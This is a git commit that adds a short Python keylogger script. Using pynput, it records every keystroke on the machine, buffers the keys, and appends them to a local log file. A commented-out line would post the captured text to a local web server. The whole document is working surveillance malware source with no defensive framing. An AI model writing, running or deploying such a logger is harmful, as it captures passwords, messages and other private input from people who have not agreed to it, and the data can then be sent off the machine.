709f9e64537ac5de22a2d9ca0b89246defff2c56
natneam <se.natneam.mesele@gmail.com>
2022-02-13 14:49:04 +0300

    first draft

---
+++ keylogger.py
@@ -0,0 +1,39 @@
+from pynput.keyboard import Listener
+import requests
+
+class KeyLogger:
+    def __init__(self, buffer_size):
+        self.data = []
+        self.buffer_size = buffer_size
+        with Listener(on_press=self.on_pressed, on_release=self.on_release) as l:
+            l.join()
+
+    def write(self):
+        log_data = "".join(self.data)
+        #write the data to local file
+        with open('log.txt', 'a') as f:
+            f.write(log_data)
+
+        #send data to the internet
+        # requests.post("localhost:8000", {'data' : log_data})
+        
+
+    def on_pressed(self, key):
+        self.data.append(self.process(key))
+        if len(self.data) == self.buffer_size:
+            self.write()
+            self.data = []
+
+    def on_release(self, key):
+        pass
+
+    def process(self, key):
+        key = str(key).replace("'", '')
+        if key == 'Key.space':
+            return ' '
+        if 'Key' in key:
+            return "\n" + key + '\n'
+        return key
+
+if __name__ == "__main__":
+    k = KeyLogger(100)
